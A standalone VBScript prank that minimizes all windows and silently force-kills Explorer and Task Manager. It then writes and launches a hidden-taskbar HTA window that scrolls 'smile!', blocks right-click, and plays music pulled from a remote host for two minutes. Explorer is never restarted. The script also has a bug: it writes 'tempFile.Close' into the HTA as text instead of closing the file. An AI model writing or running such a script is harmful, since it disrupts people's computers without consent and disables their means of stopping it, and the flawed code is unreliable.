Set Objshell = CreateObject("WScript.shell")
Set objApp = CreateObject("Shell.Application")
objApp.MinimizeAll
Objshell.Run "Taskkill /F /IM Explorer.exe /IM Taskmgr.exe",0
Call SplashScreen
Sub SplashScreen()
Dim shell : Set shell = CreateObject("WScript.Shell")
Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim tempFolder : Set tempFolder = fso.GetSpecialFolder(2)
Dim SplashName : SplashName = "Splash.hta"
Dim tempFile : Set tempFile = tempFolder.CreateTextFile(SplashName)
tempFile.Writeline "<html>"
tempFile.Writeline "<head>"
tempFile.Writeline "<bgsound src=""http://hackoo.alwaysdata.net/Matrix.mp3"" loop=""infinite"">"
tempFile.Writeline "<title>Splash Screen</title>"
tempFile.Writeline "<HTA:APPLICATION ID=""Splash Screen"""
tempFile.Writeline "APPLICATIONNAME=""Splash Screen"""
tempFile.Writeline "BORDER=""none"""
tempFile.Writeline "CAPTION=""no"""
tempFile.Writeline "SHOWINTASKBAR=""no"""
tempFile.Writeline "SINGLEINSTANCE=""yes"""
tempFile.Writeline "SYSMENU=""no"""
tempFile.Writeline "SCROLL=""no"""
tempFile.Writeline "WINDOWSTATE=""normal"">"
tempFile.Writeline "<link rel=""stylesheet"" media=""screen"" type=""text/css"" title=""design_encoder"" href=""http://hackoo.alwaysdata.net/design_encoder.css""/>"
tempFile.Writeline "</head>"
tempFile.Writeline"<SCRIPT LANGUAGE=""VBScript"">"
tempFile.Writeline "Sub CenterWindow(x,y)"        
tempFile.Writeline     "window.resizeTo x, y"      
tempFile.Writeline     "iLeft = window.screen.availWidth/2 - x/2"      
tempFile.Writeline     "itop = window.screen.availHeight/2 - y/2"    
tempFile.Writeline       "window.moveTo ileft, itop"      
tempFile.Writeline "End Sub"    
tempFile.Writeline "Sub Window_OnLoad"
tempFile.Writeline      "CenterWindow 400,300"
tempFile.Writeline      "iTimerID = window.setInterval(""ShowSplash"", 120000)"
tempFile.Writeline "End Sub"
tempFile.Writeline "Sub ShowSplash"
tempFile.Writeline     "Splash.Style.Display = ""None"""
tempFile.Writeline     "Window.Close()"
tempFile.Writeline     "End Sub"
tempFile.Writeline "</SCRIPT>"
tempFile.Writeline "<body bgcolor=""black"">"
tempFile.Writeline "<DIV id=""Splash"">"
tempFile.Writeline "<CENTER>"
tempFile.Writeline "<p>"
tempFile.Writeline "<center onselectstart=""return false"" ondragstart=""return false"" oncontextmenu=""return false"">"
tempFile.Writeline  "<marquee DIRECTION=""UP"" HEIGHT=""200"" WIDTH=""350"" SCROLLAMOUNT=""3"" onselectstart=""return false"">"
tempFile.Writeline   "<center><font face=""Comic sans MS"" color=RED size=10><b><i> smile! </i></b></font></center><br><br>"
tempFile.Writeline    "<center><font face=""Comic sans MS"" color=RED>smile!</b></font></center>"
tempFile.Writeline "</center>"
tempFile.Writeline "</p>"
tempFile.Writeline "</CENTER>"
tempFile.Writeline "</DIV>"
tempFile.Writeline "</body>"
tempFile.Writeline "</html>"
tempFile.Writeline "tempFile.Close"
shell.Run tempFolder & "\" & SplashName,1,True
End Sub
